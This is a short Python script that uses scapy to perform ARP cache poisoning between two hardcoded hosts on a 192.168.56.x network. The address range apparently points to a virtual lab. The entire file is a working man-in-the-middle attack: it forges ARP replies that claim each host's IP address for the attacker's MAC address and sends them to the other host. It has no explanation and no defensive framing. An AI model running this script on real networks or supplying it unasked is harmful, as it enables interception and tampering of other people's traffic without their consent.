from scapy.all import *
from scapy.arch import get_if_hwaddr
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp

hosts = [["192.168.56.101", "08:00:27:b7:c4:af"], ["192.168.56.102", "08:00:27:cc:08:6f"]]
interface = "enp0s3"

def poison(interface, hosts):
    macAttacker = get_if_hwaddr(interface)

    def sendPoison(srcIP, dstIP, dstMAC):
        arp = Ether() / ARP()
        arp[Ether].src = macAttacker
        arp[Ether].dst = dstMAC
        arp[ARP].hwsrc = macAttacker
        arp[ARP].psrc =  srcIP
        arp[ARP].hwdst = dstMAC
        arp[ARP].pdst = dstIP

        sendp(arp, iface = interface)

    for host1 in hosts:
        for host2 in hosts:
            if host1 != host2:
                sendPoison(host1[0], host2[0], host2[1])

if __name__ == '__main__':
    poison(interface, hosts)
